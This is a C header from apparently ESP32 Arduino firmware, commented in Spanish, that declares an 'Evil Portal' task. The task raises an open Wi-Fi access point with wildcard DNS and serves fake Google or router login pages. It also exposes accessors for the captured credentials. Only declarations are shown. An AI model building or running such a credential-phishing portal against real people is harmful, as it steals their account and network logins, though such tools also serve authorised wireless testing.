#ifndef WIFI_PORTAL_TASK_H_
#define WIFI_PORTAL_TASK_H_
#include <Arduino.h>

// Worker del Evil Portal: levanta un AP abierto + DNS wildcard + servidor web
// (WebServer síncrono) que sirve una plantilla de login y captura los POST a
// "/post". Corre en su propia tarea (estilo wifi_attack_task) mientras ui_task
// solo dibuja el estado. Solo puede haber un portal vivo a la vez.

// Notificaciones de control hacia la tarea.
enum PortalCommands {
    PORTAL_STOP = 1
};

// Plantillas disponibles (índice usado por la app y el worker).
enum PortalTemplateId {
    TPL_GOOGLE = 0,
    TPL_ROUTER,
    TPL_COUNT
};

// Parámetros de arranque: se reservan con malloc en startPortalTask y los
// libera el worker (igual que RadioTaskParams).
typedef struct {
    char    ssid[33];
    uint8_t channel;
    uint8_t templateId;
} PortalTaskParams;

extern TaskHandle_t portalTaskHandle;

// Arranca el portal con la configuración dada. Devuelve false si ya hay uno
// corriendo o si falla la creación de la tarea.
bool startPortalTask(const String &ssid, uint8_t channel, uint8_t templateId);
// Pide parada y espera (acotado) a que el worker desmonte AP/DNS/web.
void stopPortalTask();

// Accesores de estado seguros para leer desde ui_task.
uint32_t portalGetCapturedCount();
void     portalGetLastCred(char *buf, size_t len);
void     portalGetApIp(char *buf, size_t len);

#endif
